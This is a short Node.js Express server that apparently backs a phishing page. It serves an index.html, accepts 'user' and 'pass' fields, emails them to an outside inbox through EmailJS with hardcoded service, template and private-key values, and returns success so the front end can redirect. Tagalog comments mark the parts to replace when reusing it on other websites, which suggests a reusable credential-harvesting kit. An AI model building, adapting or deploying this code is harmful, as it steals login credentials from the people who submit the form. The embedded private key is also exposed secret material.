import express from "express";
import path from "path";
import { fileURLToPath } from "url";
import cors from "cors";
import emailjs from "@emailjs/nodejs";

const app = express();
const PORT = process.env.PORT || 3000;

// ES Modules setup
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static(__dirname));

// Serve HTML
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

// POST route to handle form submission
app.post("/send", async (req, res) => {   /* <- PALITAN kung ibang route sa bagong website */
  const { user, pass } = req.body;       /* <- PALITAN ayon sa form fields ng bagong website */

  const templateParams = { user, pass }; /* <- PALITAN ayon sa form fields */

  try {
    const response = await emailjs.send(
      "service_w7q3bge",       // <- PALITAN: EmailJS Service ID
      "template_oply56o",      // <- PALITAN: EmailJS Template ID
      templateParams,
      "CblrELnhPGSB5KdMO-Y3m"  // <- PALITAN: EmailJS Private Key
    );

    console.log("✅ Email sent:", response.text);

    // ✅ Important: respond with 200 to allow front-end to redirect
    res.status(200).json({ message: "Email sent successfully" });

  } catch (err) {
    console.error("❌ Email send error:", err);
    res.status(500).json({ message: "Failed to send email" });
  }
});

// Start server
app.listen(PORT, () => {
  console.log(`✅ Server running on port ${PORT}`);
});
